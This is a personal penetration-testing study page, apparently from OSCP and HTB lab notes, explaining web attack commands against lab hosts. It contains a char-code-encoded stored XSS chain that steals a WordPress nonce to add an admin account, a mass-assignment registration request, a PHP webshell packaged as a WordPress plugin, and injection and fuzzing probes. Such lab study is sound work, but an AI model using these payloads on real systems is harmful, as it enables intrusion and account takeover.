# Web Applications, Command Breakdowns

Part of [[COMMAND BREAKDOWNS]]. CMS-specific and API-specific exploit chains that are condensed enough to look like line noise. See that page for the entry format.

---

## Nonce theft + `eval(String.fromCharCode(...))`: stored XSS to WordPress admin account

**Full payload delivery:**
```bash
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(<encoded_values_here>))</script>" --proxy 127.0.0.1:8080
```
built from this JS, minified and char-code-encoded before delivery:
```javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

**Piece by piece:** this is a multi-stage chain condensed into one delivery mechanism, worth separating into what it does versus how it's smuggled.

*What it does, conceptually:*
- The stored XSS payload doesn't try to steal a session cookie (WordPress marks its auth cookies `HttpOnly`, JavaScript can't read them at all). Instead, it runs *inside the admin's own already-authenticated browser session* and uses that session to act on the attacker's behalf, cookie theft was never necessary.
- `new XMLHttpRequest()` to `/wp-admin/user-new.php`, `open(..., false)` → a **synchronous** (blocking) GET request, made from inside the victim admin's browser, which means it's sent with the admin's own session cookies automatically attached, no theft needed, the browser does it for you.
- `nonceRegex = /ser" value="([^"]*?)"/g` → scrapes WordPress's own CSRF-protection token (a "nonce," a per-request random value) directly out of the HTML the admin's browser just fetched. The pattern deliberately matches partial text (`ser"` rather than the full `user"`) so it matches regardless of whether the surrounding HTML attribute is `User"` or `user"`, a small case-insensitivity hack via partial matching instead of a regex flag.
- Why a nonce doesn't stop this at all → a nonce defeats *blind* CSRF (tricking a victim into submitting a forged request they never see). It does nothing against an attack running *inside* the victim's own browser, which can simply fetch a fresh, completely legitimate nonce for itself before acting, exactly like a real logged-in user would.
- The second (not shown above, but chained after) POST to the same `user-new.php` endpoint uses that stolen nonce to create a new `administrator`-role account, again riding the admin's own session.

*How it's smuggled:*
- Minified first (to fit in a single header value), then run through a char-code encoder (`charCodeAt` per character) to turn the entire script into a comma-separated list of numbers.
- `<script>eval(String.fromCharCode(<encoded_values_here>))</script>` → `String.fromCharCode()` reconstructs the original string from those numbers at runtime in the victim's browser, and `eval()` executes the reconstructed string as JavaScript. This encoding exists because the delivery vector is an HTTP header (`User-Agent`), and raw script text full of quotes/angle-brackets/slashes is fragile to smuggle through a header value and whatever the app does when it stores/re-renders it, a flat list of numbers has none of those problematic characters.
- `--user-agent "..."` → the actual injection point, a stored-XSS field (WordPress's Visitors plugin logs and later re-displays the User-Agent header unsanitized), so the payload only fires later, whenever an admin views that plugin's dashboard.

**Where this comes from:** the nonce-theft-via-synchronous-XHR pattern is a well-documented WordPress attack chain, HackTricks' WordPress pentesting page covers nonce/CSRF bypass via stored XSS explicitly. CyberChef's "To Charcode"/"From Charcode" recipe operations do the same encode/decode step shown here without writing custom JS. PayloadsAllTheThings' XSS cheat sheet has more `eval(String.fromCharCode(...))`-style delivery variants for different injection contexts.

**Where to look in the response:** there's nothing to grep in an HTTP response for this one, the payload only proves itself out-of-band. Confirmation is logging in as the real admin, opening the vulnerable plugin's dashboard (which triggers stored execution), then checking **Users** in the WordPress sidebar for the new `attacker` account with role `administrator`.

🔁 **Seen in:** [[Introduction to Web Application Attacks#8.4.5. Privilege Escalation via XSS|Introduction to Web Application Attacks, 8.4.5]].

#### Tags: #XSS #WordPressNonce #CSRF #EvalExploit #CommandBreakdowns

---

## Mass-assignment registration payload (undocumented `admin` field)

**Full command:**
```bash
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' \
  -H 'Content-Type: application/json' \
  http://192.168.50.16:5002/users/v1/register
```

**Piece by piece:**
- The visible/expected fields (`password`, `username`, `email`) → this is the legitimate, documented shape of a registration request, the kind you'd see just by testing the form normally.
- `"admin":"True"` → the entire exploit, and the reason this is worth a breakdown at all: **nothing about this field is documented, discoverable from the app's UI, or hinted at by any error message.** It's a guess based on the vulnerability *class* (mass assignment / over-posting), not a value read off the page. The reasoning: if a backend blindly maps every key in a JSON request body onto a database record's fields (a common shortcut in quickly-built REST APIs, e.g. Flask/SQLAlchemy patterns that auto-map request JSON to a model), then any field that exists as a column but isn't explicitly filtered out of the *input* side becomes attacker-controllable, even if the UI never exposes a way to set it.
- Why `"True"` (capitalized) specifically, not `true` → this particular API happens to be Python-backed (Flask), where `True` is the literal boolean spelling, a hint from the target's tech stack (identified via earlier fingerprinting) about which capitalization is likely to actually parse as a boolean rather than a harmless string.
- No error response on submission → the tell that it worked. A backend that validates its input schema strictly would reject or silently drop an unrecognized field, getting back a normal success response (rather than a validation error) is itself the signal that the extra field was accepted.

**Where this comes from:** this is the textbook example of the OWASP "Mass Assignment" vulnerability class (part of the OWASP API Security Top 10). HackTricks' API pentesting methodology page and PayloadsAllTheThings' API Security checklist both cover the general technique: once you've mapped an object's *visible* fields, try adding plausible hidden/privileged field names (`admin`, `role`, `isAdmin`, `verified`) to a write request and see if any get silently accepted.

**Where to look in the response:** don't look for a specific value in this response, look for the *absence* of a rejection. Confirm the field actually took effect by logging in as the new account afterward and checking whether it has elevated access (in this case, the ability to overwrite another user's password via a `PUT` request that would otherwise require admin auth).

🔁 **Seen in:** [[Introduction to Web Application Attacks#8.3.3. Enumerating and Abusing APIs|Introduction to Web Application Attacks, 8.3.3]], Step 5.

#### Tags: #MassAssignment #RESTAPI #APIEnumeration #CommandBreakdowns

---

## WordPress plugin-header comment block as machine-readable metadata

**Full command:**
```bash
cat > /tmp/shell/shell.php << 'EOF'
<?php
/*
Plugin Name: shell
*/
system($_GET['cmd']);
EOF
cd /tmp && zip -r shell.zip shell
```

**Piece by piece:**
- `/* Plugin Name: shell */` → looks like a decorative comment, but it's structurally load-bearing. WordPress's plugin loader **parses PHP comment headers as structured metadata** to populate the Plugins admin screen (name, version, author, description all follow this same `Key: Value` inside a top-of-file comment block convention). Without a recognized `Plugin Name:` line, WordPress won't treat the uploaded zip as an installable plugin at all, it'll just be an inert zip file sitting in the uploads directory.
- `system($_GET['cmd'])` outside the comment block → this is the actual payload, plain unauthenticated command execution via a `cmd` GET parameter, same pattern as every other webshell in this vault. It sits completely unprotected by any hook or authentication check, meaning once the plugin is active, it fires on every single page load, not just a specific admin-triggered action.
- Why it has to be zipped into a subdirectory (`shell/shell.php`, not just `shell.php` at the zip root) → WordPress's plugin uploader expects a specific structure, either a single top-level `.php` file or (as here) a folder containing the plugin's files, mirroring how real plugins are distributed. Zipping the bare file at the root without a containing folder can cause the upload to be accepted differently or rejected, matching the expected folder-per-plugin convention avoids that ambiguity.
- Why this delivery path exists at all (rather than just editing `404.php` via the Theme File Editor) → WordPress's built-in fatal-error-protection feature does a **loopback check** before saving a Theme/Plugin Editor change (it tries to re-request the site to confirm the edit didn't break it), which fails hard on isolated lab networks where the server can't reach its own hostname. Plugin *upload* has no such loopback check at install time, sidestepping that failure entirely.

**Where this comes from:** the WordPress Plugin Handbook documents the required header comment format for any plugin file (`developer.wordpress.org`, "Plugin Header Requirements"). This specific admin-to-RCE-via-plugin-upload technique (as a fallback when Theme Editor fails) is a commonly documented WordPress post-exploitation pattern, covered on HackTricks' WordPress page under privilege-escalation-to-RCE methods.

**Where to look in the response:** after activation, hit the plugin's exec parameter directly and look for command output in the raw response body (no wrapping, e.g. `curl "http://<target>/?cmd=id"` returning `uid=33(www-data)...` directly), confirming the plugin is both installed and actively executing on every page load as expected.

🔁 **Seen in:** [[SQL Injection Attacks#🏆 Capstone Labs|SQL Injection Attacks, Capstone VM #1]], Step 10. Companion entry in [[Web Applications|Command Appendix]].

#### Tags: #WordPress #PluginRCE #AdminToRCE #CommandBreakdowns

---

## Why 405 (not 404) means the path exists, just the wrong HTTP method

**Full commands:**
```bash
curl -i http://<target>/users/v1/admin/password
# HTTP/1.1 405 METHOD NOT ALLOWED

curl -i -X PUT http://<target>/users/v1/admin/password
# HTTP/1.1 200 OK (or whatever success looks like for this endpoint)
```

**Piece by piece:**
- **What routing actually does under the hood** → a web framework's router matches a request in two separate steps: first, does this *path* map to a registered route at all, then, does the *method* used (GET/POST/PUT/DELETE) match one the route handler actually accepts. These are genuinely two different checks, and REST frameworks (Flask, Express, Django REST Framework, etc) return a different status code for each failure specifically so a client (or an attacker probing blind) can tell them apart.
- **`404 Not Found`** → the first check failed, no route is registered for this path at all, full stop. Nothing exists here.
- **`405 Method Not Allowed`** → the first check *passed* (the path is real, a handler exists for it) but the second check failed, the handler just doesn't accept the specific verb you used. This is genuinely a much stronger signal than a 404: it confirms the endpoint's existence even though the exact request that would succeed hasn't been found yet.
- **Why this matters for enumeration specifically** → a Gobuster run using plain `GET` requests (its default) will report a valid `PUT`-only or `POST`-only endpoint as if it doesn't exist, `404`, unless you're paying attention to `405`s specifically and following up on them by hand with other methods. Treating every non-200 the same way (as "nothing here") silently hides real attack surface.
- **What to actually do once you spot a `405`** → try the other common REST verbs against the exact same path (`PUT`, `POST`, `DELETE`, `PATCH`), a `405` response sometimes even includes an `Allow:` header listing exactly which methods *are* accepted, worth checking the full response headers, not just the status line.

**Where this comes from:** HTTP status code semantics are defined in RFC 9110 (formerly RFC 7231), §15.5.6 specifically covers 405 and explicitly requires servers to include the `Allow` header naming valid methods. This isn't an OSCP-specific trick, it's standard REST API behavior worth recognizing on sight.

**Where to look in the response:** the numeric status line (`HTTP/1.1 405 METHOD NOT ALLOWED`) is the whole signal, and check the response headers for an `Allow:` line before guessing at methods one by one.

🔁 **Seen in:** [[Introduction to Web Application Attacks#8.3.3. Enumerating and Abusing APIs|Introduction to Web Application Attacks, 8.3.3]], Steps 3-4.

#### Tags: #RESTAPI #HTTPMethodDetection #405VS404 #APIEnumeration #CommandBreakdowns

---

## Systematic injection-type elimination when there's no obvious hint

**Full sequence:**
```bash
curl -X POST --data 'username=test&password=test&ffa=test'          # baseline
curl -X POST --data 'username=test&password=test&ffa=1%2B1'         # arithmetic: expect "2"?
curl -X POST --data 'username=test&password=test&ffa={{7*7}}'       # template (Jinja2 SSTI): expect "49"?
curl -X POST --data-urlencode 'ffa=`id`' --data 'username=test&password=test'   # OS metacharacters
```

**Piece by piece:**
- **Why a baseline request comes first** → without knowing what "normal, unprocessed" looks like for this specific field, there's nothing to compare later responses against. The baseline here echoed `Status: test` verbatim, that's the reference point every subsequent test gets measured against.
- **Why arithmetic before template syntax, and template syntax before OS metacharacters** → this ordering isn't arbitrary, it goes from *least* to *most* powerful, and each rung tests a genuinely different execution context: plain arithmetic (`1+1` → `2`) only fires if the value passes through something that evaluates expressions at all (a raw `eval()`, for instance). Template syntax (`{{7*7}}` → `49`) only fires if there's a template engine (Jinja2, Twig, etc) actively rendering the input as a template rather than treating it as plain string data, a meaningfully different, more specific bug (Server-Side Template Injection) than generic code evaluation. OS metacharacters (backticks, `$()`) only matter if the value reaches an actual shell invocation. Testing cheapest/most-specific-signal-first avoids jumping straight to "try to pop a shell" against a field that might turn out to be nothing more dangerous than an `eval()`.
- **Why watching for *any* behavior change matters more than watching for a "successful" hit** → in the actual case this reasoning came from, none of the "expected" positive signals (`2`, `49`) ever appeared. What changed instead was that the **entire response field went blank** the moment backtick/`$()` syntax was used, a difference from every earlier test, which had always echoed the literal raw input back unmodified. A blank field isn't "nothing happened", it's evidence that *something* consumed and processed the input differently than plain string echoing does, worth chasing even though it doesn't match either of the "expected" success patterns.
- **Why a quote-character disappearing (rather than being HTML-escaped) is its own separate signal** → noticed alongside the arithmetic/template tests: double quotes vanished from the reflected output while single quotes survived intact. Escaping (`&quot;` appearing instead of `"`) would mean the app is defensively encoding output. Outright *removal* with no trace left behind means something is actively filtering that specific character before it's ever reflected, a meaningfully different (and more informative) failure mode, worth switching quote style in the next payload attempt rather than assuming the whole injection point is dead.

**Where this comes from:** this isn't a named technique from any single reference, it's a general diagnostic methodology (also mirrored in [[SQL Injection & Databases (Decision Tree)|the SQLi Decision Tree's own triage entry]]), the underlying principle, test cheap/specific signals before expensive/general ones, and treat *any* deviation from baseline as data, applies to unknown injection points generally, not just this one field.

**Where to look in the response:** compare every test's response against the Step 1 baseline specifically, not against what you expected to see. A field that stops echoing, goes blank, changes length, or drops a specific character are all real signals, a direct "expected value appeared" hit is just the easiest one to notice, not the only one that counts.

🔁 **Seen in:** [[Common Web Application Attacks#9.4.1. OS Command Injection|Common Web Application Attacks, 9.4.1]], Capstone VM #3 (Future Factor Authentication), Steps 1-4.

#### Tags: #DiagnosticMethodology #SSTI #CommandInjection #BlindInjection #CommandBreakdowns

---

---

## Ffuf two-step filtering and the `-ac` shortcut

```bash
# Step 1 — no filter, observe noise
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u 'http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key'
# Output floods with hundreds of identical-size hits: Size: 798, Size: 798, Size: 798...

# Step 2 — filter the noise
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u 'http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key' \
     -fs 798
# Output: just "user [Status: 200, Size: 783]"

# Shortcut: -ac does both steps automatically
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
     -u http://academy.htb:PORT/ \
     -H 'Host: FUZZ.academy.htb' \
     -ac
```

**Piece by piece:**

- **Why the first pass floods with hits** → the server returns a non-404 for every parameter name because its default behavior is to process any `?FUZZ=key` request and return a "generic" page (the admin panel HTML, for instance) regardless of whether `FUZZ` is a real parameter. That page is always 798 bytes. Without filtering, ffuf faithfully reports every hit.

- **What `-fs 798` actually does** → `fs` stands for "filter size". Ffuf compares each response's `Content-Length` (or measured body size) against 798 and silently discards any match. The one response that has a different size (783, because the server returned something slightly different when it actually recognized the `user` parameter) survives the filter and appears in output.

- **Why size is a reliable signal here** → the server's "don't recognize this parameter" response is deterministic: same template, same content, same size every time. The moment a parameter name triggers real server-side logic (looking up a user, rendering a section, checking a value), the response changes even slightly. That slight change in size is the signal.

- **When `-fw` or `-fl` is better than `-fs`** → if the server's "noise" responses vary slightly in size (dynamic timestamps, session IDs injected into the body), filtering on size will break: some noise responses will slip through and some real hits will get filtered. Filter on word count (`-fw`) or line count (`-fl`) instead, those are more stable across dynamic content because word/line structure doesn't change just because a timestamp value changed. Always eyeball the noise output to see which attribute is most consistent.

- **What `-ac` does internally** → ffuf sends a few canary requests with deliberately nonsense FUZZ values (values guaranteed not to match anything real) and records the baseline response attributes (size, words, lines). It then sets filters on those attributes automatically. It's the same two-step workflow, just automated. The reason you might still prefer the manual approach: if ffuf's canary responses happen to accidentally match a real endpoint (unlikely but possible with very short wordlists), `-ac` may over-filter and miss real hits. In practice `-ac` is reliable on web targets.

- **Why `-mr` beats `-fs` when you know the hit content** → `-mr "You don't have access!"` tells ffuf to only report responses whose body matches that regex. Instead of "responses whose size differs from noise," the signal is "responses containing this specific text." This is more precise: it doesn't break when response sizes are variable, and it directly confirms the page has the content you're looking for. The tradeoff is that you need to know in advance what the valid response looks like.

🔁 **Seen in:** [[Attacking Web Applications with Ffuf (HTB Supplementary)#FF.5. VHost Fuzzing and Filtering Results|FF.5 VHost filtering]], [[Attacking Web Applications with Ffuf (HTB Supplementary)#FF.6. Parameter Fuzzing (GET)|FF.6 GET param fuzzing]], [[Attacking Web Applications with Ffuf (HTB Supplementary)#FF.8. Skills Assessment. Web Fuzzing|FF.8 Skills Assessment Q3 (-mr usage)]]

#### Tags: #Ffuf #FilteringResults #ResponseFiltering #WebFuzzing #CommandBreakdowns

---

## **Outstanding**
- [ ] WordPress `admin-ajax.php` unauthenticated SQLi routing (why every plugin action shares one endpoint), phpass hash format.
